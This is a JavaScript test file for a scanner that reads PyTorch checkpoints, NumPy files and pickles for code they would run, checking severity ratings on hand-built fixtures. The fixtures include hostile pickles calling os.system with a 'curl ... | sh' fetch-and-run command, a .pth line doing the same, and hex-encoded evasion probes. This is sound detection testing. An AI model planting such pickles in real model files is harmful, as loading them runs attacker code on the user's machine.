// FP-MODEL-FILES: a model file's pickles are read for what they would run, in the npm package's project scan and
// --deps, as the Python package reads them (python/tests/scanner/test_review_model_files.py; the engine's pickle/,
// through collect_file and model_own). A PyTorch checkpoint is a zip by design: it was SC-NESTED-ARCHIVE (WARN)
// while what loading it runs was never read. Inert bytes written opcode by opcode: nothing is unpickled or loaded.

import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync, openSync, writeSync, ftruncateSync, closeSync,
  statSync } from "node:fs";
import * as zlib from "node:zlib";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { run } from "../src/index.js";

const b = (...parts) => Buffer.concat(parts.map((p) => (typeof p === "string" ? Buffer.from(p, "latin1") : Buffer.from(p))));
const su = (s) => b([0x8c, s.length], s);                         // SHORT_BINUNICODE
const glob = (m, n) => `c${m}\n${n}\n`;                            // GLOBAL
const STOP = ".";

// torch.save's data.pkl for {"w": tensor}: _rebuild_tensor_v2 on a persistent storage
const STATE_DICT = b([0x80, 2], glob("collections", "OrderedDict"), ")R", "q\x00", su("w"),
  glob("torch._utils", "_rebuild_tensor_v2"), "((", su("storage"), glob("torch", "FloatStorage"), su("0"), su("cpu"),
  "K\x04tQ", "K\x00K\x02K\x02", [0x86], "K\x02K\x01", [0x86, 0x89], glob("collections", "OrderedDict"), ")RtRs", STOP);
const OS_SYSTEM = (cmd) => b([0x80, 2], glob("os", "system"), su(cmd), [0x85], "R", STOP);

const crc32 = (buf) => {
  let c = ~0;
  for (const x of buf) { c ^= x; for (let k = 0; k < 8; k++) c = (c >>> 1) ^ (0xedb88320 & -(c & 1)); }
  return ~c >>> 0;
};
/** A zip of stored entries, as torch.save and numpy.savez write them. */
function zipOf(entries) {
  const parts = [], cd = [];
  let off = 0;
  for (const [name, body] of entries) {
    const n = Buffer.from(name), d = Buffer.from(body);
    const head = Buffer.alloc(30);
    head.writeUInt32LE(0x04034b50, 0); head.writeUInt16LE(20, 4); head.writeUInt32LE(crc32(d), 14);
    head.writeUInt32LE(d.length, 18); head.writeUInt32LE(d.length, 22); head.writeUInt16LE(n.length, 26);
    parts.push(head, n, d);
    const c = Buffer.alloc(46);
    c.writeUInt32LE(0x02014b50, 0); c.writeUInt16LE(20, 4); c.writeUInt16LE(20, 6); c.writeUInt32LE(crc32(d), 16);
    c.writeUInt32LE(d.length, 20); c.writeUInt32LE(d.length, 24); c.writeUInt16LE(n.length, 28); c.writeUInt32LE(off, 42);
    cd.push(c, n);
    off += 30 + n.length + d.length;
  }
  const cdBuf = Buffer.concat(cd);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(entries.length, 8); end.writeUInt16LE(entries.length, 10);
  end.writeUInt32LE(cdBuf.length, 12); end.writeUInt32LE(off, 16);
  return Buffer.concat([...parts, cdBuf, end]);
}
const checkpoint = (pkl, name = "archive") => zipOf([[`${name}/data.pkl`, pkl], [`${name}/byteorder`, "little"],
  [`${name}/data/0`, Buffer.alloc(16)], [`${name}/version`, "3\n"]]);
function npy(descr, after) {
  let h = `{'descr': ${descr}, 'fortran_order': False, 'shape': (3,), }`;
  while ((10 + h.length + 1) % 64 !== 0) h += " ";
  h += "\n";
  const len = Buffer.alloc(2);
  len.writeUInt16LE(h.length);
  return b("\x93NUMPY\x01\x00", len, h, after);
}

function tree(files) {
  const d = mkdtempSync(join(tmpdir(), "lazaret-model-"));
  for (const [rel, data] of Object.entries(files)) {
    const p = join(d, ...rel.split("/"));
    mkdirSync(dirname(p), { recursive: true });
    writeFileSync(p, data);
  }
  return d;
}
function scan(files, extra = []) {
  const d = tree(files);
  try {
    const err = [];
    const code = run(["check", d, "-q", "--no-html", ...extra], { out: () => {}, err: (s) => err.push(s) });
    const issues = JSON.parse(readFileSync(join(d, "lazaret-report.json"), "utf8")).issues;
    return { code, err: err.join("\n"), issues };
  } finally { rmSync(d, { recursive: true, force: true }); }
}
const sc = (issues, prefix = "") => issues.filter((i) => i.rule.startsWith("SC-") && i.file.replaceAll("\\", "/").startsWith(prefix))
  .map((i) => [i.file.replaceAll("\\", "/"), i.rule, i.sev]).sort();

test("a checkpoint is read, not reported as an embedded archive (the false positive)", () => {
  const r = scan({ "golden/golden.pt": checkpoint(STATE_DICT, "golden"), "model.py": "import mlx\n" });
  assert.deepEqual(sc(r.issues), []);
  assert.equal(r.code, 0, r.err);
});

test("hostile pickles, in a checkpoint, a second data.pkl, an .npy and an .npz, are CRITICAL", () => {
  const r = scan({
    "bad.pt": checkpoint(OS_SYSTEM("curl -s http://192.0.2.1/a | sh")),
    "two.pt": zipOf([["a/data.pkl", STATE_DICT], ["a/version", "3\n"], ["b/data.pkl", OS_SYSTEM("id")]]),
    "o.npy": npy("'|O'", OS_SYSTEM("id")),
    "x.npz": zipOf([["w.npy", npy("'<f8'", Buffer.alloc(24))], ["o.npy", npy("'|O'", OS_SYSTEM("id"))]]),
    "sg.pkl": b([0x80, 4], su("os"), [0x94], su("system"), [0x94], "h\x00h\x01", [0x93], su("id"), [0x85], "R", STOP),
    "app.py": "x = 1\n" });
  const crit = sc(r.issues).filter(([, rule]) => rule === "SC-PICKLE-CODE").map(([f]) => f);
  assert.deepEqual([...new Set(crit)].sort(), ["bad.pt", "o.npy", "sg.pkl", "two.pt", "x.npz"]);
  assert.ok(r.issues.some((i) => i.rule === "SC-PICKLE-CODE" && i.msg.includes("b/data.pkl")));
  assert.ok(sc(r.issues).some(([f, rule]) => f === "two.pt" && rule === "SC-NESTED-ARCHIVE"));   // (a member a checkpoint has not)
});

test("benign files are quiet; a call told what to use by text is MAJOR; the project's own class is INFO", () => {
  const r = scan({
    "w.npy": npy("'<f8'", Buffer.alloc(24)),
    "hp.pkl": "(dp0\nS'lr'\np1\nF0.1\ns.",
    "run.pkl": b([0x80, 2], glob("somelib.util", "run"), su("rm -rf /tmp/x"), [0x85], "R", STOP),
    "net.pt": checkpoint(b([0x80, 2], glob("mymodel", "Net"), ")", [0x81], "}b", STOP)),
    "mymodel.py": "class Net: pass\n" });
  // (the project's own module: listed, setting no verdict, as its code is the scan's to read: John, Oct 21)
  assert.deepEqual(sc(r.issues), [["net.pt", "SC-PICKLE-GLOBAL", "INFO"], ["run.pkl", "SC-PICKLE-GLOBAL", "MAJOR"]]);
});

test("what cannot be read is SC-TRUNCATED", () => {
  const cut = OS_SYSTEM("id").subarray(0, -2);
  const r = scan({ "cut.pkl": cut, "m.pkl.bz2": b("BZh91AY&SY", Buffer.alloc(20)), "app.py": "x = 1\n" });
  assert.deepEqual(sc(r.issues).filter(([, rule]) => rule === "SC-TRUNCATED").map(([f]) => f), ["cut.pkl", "m.pkl.bz2"]);
});

test("--deps reads a dependency's model files; its own module is its own", () => {
  const sp = ".venv/lib/python3.12/site-packages";
  const files = { ".venv/pyvenv.cfg": "home = /usr/bin\n", "app.py": "import dep\n", [`${sp}/dep/__init__.py`]: "x = 1\n",
    [`${sp}/dep/model.py`]: "class M: pass\n", [`${sp}/dep/bad.pkl`]: OS_SYSTEM("id"),
    [`${sp}/dep/w.pt`]: checkpoint(b([0x80, 2], glob("dep.model", "M"), ")", [0x81], "}b", STOP)) };
  const r = scan(files, ["--deps"]);
  assert.deepEqual(sc(r.issues, ".venv/").map(([f, rule]) => [f, rule]),
    [[`${sp}/dep/bad.pkl`, "SC-PICKLE-CODE"], [`${sp}/dep/w.pt`, "SC-PICKLE-GLOBAL"]]);
  assert.deepEqual(sc(scan(files).issues, ".venv/lib"), []);
});

// The re-review of Oct 30's probes, byte for byte (hand-built, never loaded), SC-PICKLE-CODE as on base: a member an
// object was given as the extend, append or add that APPEND, APPENDS or ADDITEMS call (a01 to a09), a member as the
// class a constructor makes (numpy's _reconstruct ...: b01 to b07), a member's dotted name where Python looks it up
// with a plain getattr (GLOBAL below protocol 4, numpy's _ufunc_reconstruct: k01, k02, k04).
const REREVIEW_311 = {
  "a01.pkl": "800263636f6c6c656374696f6e730a4f726465726564446963740a29527d8c06657874656e64637369676e616c0a5349475445524d0a73624b01612e",
  "a02.pkl": "800263636f6c6c656374696f6e730a4f726465726564446963740a29527d8c06617070656e64637369676e616c0a5349475445524d0a73624b01612e",
  "a03.pkl": "800263636f6c6c656374696f6e730a4f726465726564446963740a29527d8c06657874656e64637369676e616c0a5349475445524d0a7362284b014b02652e",
  "a04.pkl": "800463636f6c6c656374696f6e730a4f726465726564446963740a29527d8c03616464637369676e616c0a5349475445524d0a7362284b01902e",
  "a05.pkl": "800263636f6c6c656374696f6e730a4f726465726564446963740a29524e7d8c06657874656e64637369676e616c0a5349475445524d0a7386624b01612e",
  "a06.pkl": "80026361726770617273650a4e616d6573706163650a29817d8c06657874656e64637369676e616c0a5349475445524d0a73624b01612e",
  "a07.pkl": "800263636f6c6c656374696f6e730a4f726465726564446963740a29527d8c06657874656e64636275696c74696e730a676574617474720a6373736c0a544c5356657273696f6e0a8c07544c5376315f32865273624b01612e",
  "a08.pkl": "80026361726770617273650a4e616d6573706163650a29817d8c06657874656e6463736f636b65740a41465f494e45540a7362284b01652e",
  "a09.pkl": "800263636f70797265670a5f7265636f6e7374727563746f720a63636f6c6c656374696f6e730a4f726465726564446963740a636275696c74696e730a6f626a6563740a4e87524e7d8c06657874656e64637369676e616c0a5349475445524d0a7386624b01612e",
  "b01.pkl": "8002636e756d70792e636f72652e6d756c746961727261790a5f7265636f6e7374727563740a637369676e616c0a5349475445524d0a4b008543016287522e",
  "b02.pkl": "8002636e756d70792e5f636f72652e6d756c746961727261790a5f7265636f6e7374727563740a637369676e616c0a5349475445524d0a4b008543016287522e",
  "b03.pkl": "8002636e756d70792e6d612e636f72650a5f6d617265636f6e7374727563740a28637369676e616c0a5349475445524d0a636e756d70790a6e6461727261790a4b008543016274522e",
  "b04.pkl": "80026361727261790a5f61727261795f7265636f6e7374727563746f720a28637369676e616c0a5349475445524d0a8c01624b00430074522e",
  "b05.pkl": "8002636e756d70792e72616e646f6d2e6269745f67656e657261746f720a5f5f7079785f756e7069636b6c655f5365656453657175656e63650a637369676e616c0a5349475445524d0a4b004e87522e",
  "b06.pkl": "800263746f7263682e5f7574696c730a5f72656275696c645f777261707065725f737562636c6173730a28637369676e616c0a5349475445524d0a63746f7263680a666c6f617433320a4b01854b01854b004e8c036370758974522e",
  "b07.pkl": "8002636e756d70792e5f636f72652e5f696e7465726e616c0a5f7265636f6e7374727563740a637369676e616c0a5349475445524d0a4b008543016287522e",
  "k01.pkl": "80026373736c0a544c5356657273696f6e2e544c5376315f320a852e",
  "k02.pkl": "6373736c0a507572706f73652e5345525645525f415554480a2e",
  "k04.pkl": "8002636e756d70792e636f72650a5f7566756e635f7265636f6e7374727563740a8c0373736c8c12544c5356657273696f6e2e544c5376315f3286522e",
};

// The re-check of Oct 30's probes (round 3), byte for byte: a member given as the extend, append or add that APPEND,
// APPENDS or ADDITEMS call through a slot state's __dict__ or torch's setattr-style state (g01, g01b, g02), a dict
// installed by reference and filled later (g06, g07, g18), an alias of the object (g03, g03b, g04, g05) or joblib's
// memoised wrapper (g17): SC-PICKLE-CODE, as on base.
const RECHECK_311 = {
  "g01.pkl": "800263636f6c6c656374696f6e730a4f726465726564446963740a29524e7d8c085f5f646963745f5f7d8c06657874656e64637369676e616c0a5349475445524d0a737386624b01612e",
  "g01b.pkl": "800463636f6c6c656374696f6e730a4f726465726564446963740a29524e7d8c085f5f646963745f5f7d8c03616464637369676e616c0a5349475445524d0a73738662284b01902e",
  "g02.pkl": "800263746f7263682e5f7574696c730a5f72656275696c645f706172616d657465725f776974685f73746174650a284e8963636f6c6c656374696f6e730a4f726465726564446963740a29527d8c085f5f646963745f5f7d8c06657874656e64637369676e616c0a5349475445524d0a737374524b01612e",
  "g03.pkl": "800263636f6c6c656374696f6e730a4f726465726564446963740a29527d8c06657874656e64637369676e616c0a5349475445524d0a7362710030635f6f70657261746f720a6765746974656d0a6800854b0086524b01612e",
  "g03b.pkl": "800263636f6c6c656374696f6e730a4f726465726564446963740a29527d8c06657874656e64637369676e616c0a5349475445524d0a7362710030636f70657261746f720a6765746974656d0a7d8c016b6800738c016b86524b01612e",
  "g04.pkl": "8002636c6f6767696e670a6765744c6f676765720a8c017885527d8c06657874656e64637369676e616c0a5349475445524d0a736230636c6f6767696e670a6765744c6f676765720a8c017885524b01612e",
  "g05.pkl": "800263757569640a53616665555549440a4b0085527d8c06657874656e64637369676e616c0a5349475445524d0a73623063757569640a53616665555549440a4b0085524b01612e",
  "g06.pkl": "80026366756e63746f6f6c730a7061727469616c0a636275696c74696e730a696e740a855228636275696c74696e730a696e740a297d7d7101746268018c06657874656e64637369676e616c0a5349475445524d0a73304b01612e",
  "g07.pkl": "800263636f6c6c656374696f6e730a4f726465726564446963740a29524e7d8c085f5f646963745f5f7d710173866268018c06657874656e64637369676e616c0a5349475445524d0a73304b01612e",
  "g17.pkl": "8002636a6f626c69622e6e756d70795f7069636b6c650a4e756d70794172726179577261707065720a298171007d288c08737562636c617373636e756d70790a6e6461727261790a8c0573686170654b01858c056f726465728c01438c056474797065636e756d70790a64747970650a8c02663889888752284b038c013c4e4e4e4affffffff4affffffff4b0074628c0a616c6c6f775f6d6d6170888c06617070656e64637369676e616c0a5349475445524d0a756241414141414141413068004b01612e",
  "g18.pkl": "800263746f7263682e5f74656e736f720a5f72656275696c645f66726f6d5f747970650a2863746f7263680a54656e736f720a63746f7263682e6e6e2e706172616d657465720a506172616d657465720a297d7101745268018c06657874656e64637369676e616c0a5349475445524d0a73304b01612e",
};

test("a member of the standard library's data enums is data where it is kept, code where it is called (FP-MODEL-FILES-PY311)", () => {
  // Python 3.10 and 3.11.0 to 3.11.4 pickle signal.Signals.SIGTERM as the module-level alias signal.SIGTERM, 3.11.0 to
  // 3.11.4 ssl.TLSVersion.TLSv1_2 as getattr(ssl.TLSVersion, 'TLSv1_2'); 3.12 writes signal.Signals(15)
  const p2 = [0x80, 2];
  const r = scan({
    "py310.pkl": b(p2, "]q\x00(", glob("signal", "SIGTERM"), "q\x01", glob("socket", "AF_INET"), "q\x02",
      glob("ssl", "CERT_REQUIRED"), "q\x03h\x01e", STOP),
    "py311.pkl": b(p2, glob("__builtin__", "getattr"), glob("ssl", "TLSVersion"), su("TLSv1_2"), [0x86], "R", [0x85], STOP),
    "py312.pkl": b(p2, glob("signal", "Signals"), "K\x0f", [0x85], "R", [0x85], STOP),
    "state.pkl": b(p2, glob("argparse", "Namespace"), ")", [0x81], "}", su("handlers"), "}", glob("signal", "SIGTERM"),
      glob("signal", "SIG_DFL"), "ssb", STOP),
    "called.pkl": b(p2, glob("signal", "SIGTERM"), ")R", STOP),
    "made.pkl": b(p2, glob("ssl", "CERT_REQUIRED"), ")", [0x81], STOP),
    "reached.pkl": b(p2, glob("__builtin__", "getattr"), glob("signal", "SIGTERM"), su("__class__"), [0x86], "RK\x0f", [0x85], "R", STOP),
    "near.pkl": b(p2, glob("signal", "SIGTERMX"), [0x85], STOP),
    "handler.pkl": b(p2, glob("signal", "signal"), glob("signal", "SIGTERM"), glob("os", "system"), [0x86], "R", STOP),
    // (the review of Oct 29: called through an object the pickle computed, changed by SETITEM, split after its class)
    "partial.pkl": b(p2, glob("functools", "partial"), glob("signal", "SIGTERM"), [0x85], "R)R", STOP),
    "setitem.pkl": b(p2, glob("signal", "SIGTERM"), "K\x01K\x02s", STOP),
    "split.pkl": b(p2, glob("ssl.TLSVersion", "TLSv1_2"), [0x85], STOP),
    // (the re-review of Oct 30: the dotted name protocol 4's find_class walks stays data)
    "dotted4.pkl": b([0x80, 4], glob("ssl", "TLSVersion.TLSv1_2"), [0x85], STOP),
    ...Object.fromEntries(Object.entries(REREVIEW_311).map(([k, h]) => [k, Buffer.from(h, "hex")])),
    ...Object.fromEntries(Object.entries(RECHECK_311).map(([k, h]) => [k, Buffer.from(h, "hex")])),
    "app.py": "x = 1\n" });
  const crit = [...new Set(sc(r.issues).filter(([, rule, sev]) => rule === "SC-PICKLE-CODE" && sev === "CRITICAL").map(([f]) => f))];
  assert.deepEqual(crit.sort(), ["called.pkl", "handler.pkl", "made.pkl", "near.pkl", "partial.pkl", "reached.pkl",
    "setitem.pkl", "split.pkl", ...Object.keys(REREVIEW_311), ...Object.keys(RECHECK_311)].sort());
  assert.deepEqual(sc(r.issues).filter(([f]) => ["py310.pkl", "py311.pkl", "py312.pkl", "state.pkl", "dotted4.pkl"].includes(f)), []);
});

// ---- a checkpoint of 200 MB, read by range (John's decision of Oct 21) -------------------------------------------

/** torch.save's archive whose storages are runs of zeros of `sizes` bytes, as parts [Buffer, or a run's length]. */
function bigCheckpoint(pkl, sizes, more = []) {
  const zeros = Buffer.alloc(1 << 20);
  const crcZeros = (n) => {          // (zlib.crc32 where Node has it; the reader reads no CRC)
    if (typeof zlib.crc32 !== "function") return 0;
    let c = 0;
    for (; n > 0; n -= zeros.length) c = zlib.crc32(n >= zeros.length ? zeros : zeros.subarray(0, n), c);
    return c >>> 0;
  };
  const entries = [["archive/data.pkl", pkl], ["archive/byteorder", Buffer.from("little")],
    ...sizes.map((n, k) => [`archive/data/${k}`, n]), ...more, ["archive/version", Buffer.from("3\n")]];
  const parts = [], cd = [];
  let off = 0;
  for (const [name, body] of entries) {
    const n = Buffer.from(name), len = typeof body === "number" ? body : body.length;
    const crc = typeof body === "number" ? crcZeros(body) : crc32(body);
    const head = Buffer.alloc(30);
    head.writeUInt32LE(0x04034b50, 0); head.writeUInt16LE(20, 4); head.writeUInt32LE(crc, 14);
    head.writeUInt32LE(len, 18); head.writeUInt32LE(len, 22); head.writeUInt16LE(n.length, 26);
    parts.push(Buffer.concat([head, n]), body);
    const c = Buffer.alloc(46);
    c.writeUInt32LE(0x02014b50, 0); c.writeUInt16LE(20, 4); c.writeUInt16LE(20, 6); c.writeUInt32LE(crc, 16);
    c.writeUInt32LE(len, 20); c.writeUInt32LE(len, 24); c.writeUInt16LE(n.length, 28); c.writeUInt32LE(off, 42);
    cd.push(c, n);
    off += 30 + n.length + len;
  }
  const cdBuf = Buffer.concat(cd);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(entries.length, 8); end.writeUInt16LE(entries.length, 10);
  end.writeUInt32LE(cdBuf.length, 12); end.writeUInt32LE(off, 16);
  parts.push(Buffer.concat([cdBuf, end]));
  return parts;
}
/** The parts as a sparse file (its runs of zeros holes). */
function writeParts(path, parts) {
  mkdirSync(dirname(path), { recursive: true });
  const fd = openSync(path, "w");
  let at = 0;
  try {
    for (const p of parts) {
      if (typeof p === "number") at += p;
      else { writeSync(fd, p, 0, p.length, at); at += p.length; }
    }
    ftruncateSync(fd, at);
  } finally { closeSync(fd); }
}

test("a 200 MB checkpoint is read by range (a .pth one's lines in chunks): quiet when benign, CRITICAL when hostile, with --deps too", () => {
  const sp = ".venv/lib/python3.12/site-packages";
  const d = tree({ "app.py": "x = 1\n", ".venv/pyvenv.cfg": "home = /usr/bin\n", [`${sp}/dep/__init__.py`]: "x = 1\n" });
  try {
    const big = { "w/model.pt": bigCheckpoint(STATE_DICT, [100_000_000, 100_000_000]),
      "w/bad.pt": bigCheckpoint(OS_SYSTEM("curl -s http://192.0.2.1/a | sh"), [200_000_000]),
      "w/late.pt": bigCheckpoint(STATE_DICT, [200_000_000], [["archive/constants.pkl", OS_SYSTEM("id")]]),
      [`${sp}/dep/w.pt`]: bigCheckpoint(OS_SYSTEM("id"), [200_000_000]),
      // (.pth, PyTorch's usual name: its lines read in chunks, its pickle by range)
      "w/model.pth": bigCheckpoint(STATE_DICT, [100_000_000, 100_000_000]),
      "w/evil.pth": bigCheckpoint(STATE_DICT, [200_000_000],
        [["archive/extra/notes", Buffer.from("\nimport os; os.system('curl -s http://192.0.2.1/a | sh')\n")]]) };
    for (const [rel, parts] of Object.entries(big)) {
      writeParts(join(d, ...rel.split("/")), parts);
      assert.ok(statSync(join(d, ...rel.split("/"))).size > 200_000_000);
    }
    const t = Date.now();
    const code = run(["check", d, "-q", "--no-html", "--deps"], { out: () => {}, err: () => {} });
    const took = Date.now() - t;
    const issues = JSON.parse(readFileSync(join(d, "lazaret-report.json"), "utf8")).issues;
    const got = sc(issues);
    assert.deepEqual(got.filter(([f]) => f === "w/model.pt" || f === "w/model.pth"), []);
    // (a member the format has not keeps SC-NESTED-ARCHIVE beside: the external review of Oct 21)
    assert.deepEqual(got.filter(([f]) => f === "w/evil.pth").sort(), [["w/evil.pth", "SC-NESTED-ARCHIVE", "MINOR"], ["w/evil.pth", "SC-PTH-EXEC", "CRITICAL"]]);
    for (const [f, want] of [["w/bad.pt", [["SC-PICKLE-CODE", "CRITICAL"]]],
      ["w/late.pt", [["SC-NESTED-ARCHIVE", "MINOR"], ["SC-PICKLE-CODE", "CRITICAL"]]], [`${sp}/dep/w.pt`, [["SC-PICKLE-CODE", "CRITICAL"]]]]) {
      assert.deepEqual(got.filter(([g]) => g === f).map(([, rule, sev]) => [rule, sev]).sort(), want, f);
    }
    assert.ok(issues.some((i) => i.rule === "SC-PICKLE-CODE" && i.msg.includes("archive/constants.pkl")));
    // (Windows' runners are slower at this scan of 1.2 GB of checkpoints: 23.8 s on CI's js (windows-latest, 24),
    // PR #17, Oct 29, every answer right; the bound there is 60 s)
    assert.ok(took < (process.platform === "win32" ? 60_000 : 20_000), `${took} ms (exit ${code})`);
  } finally { rmSync(d, { recursive: true, force: true }); }
});
